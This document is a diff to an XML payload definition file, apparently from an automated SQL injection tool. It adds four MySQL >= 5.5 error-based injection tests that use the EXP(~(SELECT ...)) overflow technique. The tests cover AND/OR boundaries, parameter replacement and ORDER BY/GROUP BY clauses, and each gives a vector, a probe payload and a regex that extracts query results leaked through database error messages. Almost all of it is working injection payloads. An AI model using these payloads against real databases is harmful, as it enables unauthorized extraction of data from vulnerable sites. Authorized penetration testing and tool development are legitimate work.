@@ -150,6 +150,46 @@
     </test>
 
     <test>
+        <title>MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>AND EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))</vector>
+        <request>
+            <payload>AND EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.5</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.5 OR error-based - WHERE, HAVING clause (EXP)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>OR EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))</vector>
+        <request>
+            <payload>OR EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.5</dbms_version>
+        </details>
+    </test>
+
+    <test>
         <title>MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)</title>
         <stype>2</stype>
         <level>4</level>
@@ -683,6 +723,26 @@
     </test>
 
     <test>
+        <title>MySQL &gt;= 5.5 error-based - Parameter replace (EXP)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))</vector>
+        <request>
+            <payload>EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.5</dbms_version>
+        </details>
+    </test>
+
+    <test>
         <title>MySQL &gt;= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)</title>
         <stype>2</stype>
         <level>5</level>
@@ -895,6 +955,26 @@
         <details>
             <dbms>MySQL</dbms>
             <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))</vector>
+        <request>
+            <payload>,EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.5</dbms_version>
         </details>
     </test>
 
